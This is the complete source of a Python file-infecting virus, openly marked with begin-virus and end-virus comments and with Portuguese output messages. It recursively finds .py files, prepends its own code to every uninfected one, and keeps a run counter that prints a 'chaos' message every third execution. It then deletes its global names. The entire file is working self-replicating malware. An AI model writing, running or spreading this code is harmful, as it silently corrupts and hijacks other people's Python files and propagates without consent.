# begin-virus

import glob
import os

def find_files_to_infect(directory="."):
    python_files = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(".py"):
                python_files.append(os.path.join(root, file))
    return python_files

def get_content_of_file(file):
    with open(file, "r") as my_file:
        data = my_file.readlines()
    return data

def is_infected(file):
    data = get_content_of_file(file)
    return any("# begin-virus" in line for line in data)

def get_content_if_infectable(file):
    data = get_content_of_file(file)
    if not is_infected(file):
        return data
    return None

def infect(file, virus_code):
    if not is_infected(file):
        with open(file, "r+") as infected_file:
            content = infected_file.read()
            infected_file.seek(0)
            infected_file.write(virus_code + content)

def get_virus_code():
    virus_code_on = False
    virus_code = []

    with open(__file__, "r") as code_file:
        for line in code_file:
            if "# begin-virus" in line:
                virus_code_on = True
            if virus_code_on:
                virus_code.append(line)
            if "# end-virus\n" in line:
                virus_code_on = False
                break

    return "".join(virus_code)

def summon_chaos():
    print("Introduza um pouco de anarquia, desestabilize a ordem e tudo se transformará em caos.\nEu sou o agente do caos!")

def update_execution_count():
    contador_arquivo = "executions_count.txt"
    try:
        with open(contador_arquivo, "r") as contador:
            count = int(contador.read().strip())
    except FileNotFoundError:
        count = 0

    count += 1

    if count == 3:
        count = 0
        summon_chaos()

    with open(contador_arquivo, "w") as contador:
        contador.write(str(count))

if __name__ == "__main__":
    try:
        # Retrieve the virus code from the current infected script
        virus_code = get_virus_code()

        # Look for other files to infect
        for file in find_files_to_infect():
            infect(file, virus_code)

        # Update execution count and potentially trigger summon_chaos
        update_execution_count()

    except Exception as e:
        print(f"Ocorreu um erro: {e}")

    finally:
        # Delete used names from memory
        for name in list(globals().keys()):
            if name[0] != "_":
                del globals()[name]

# end-virus
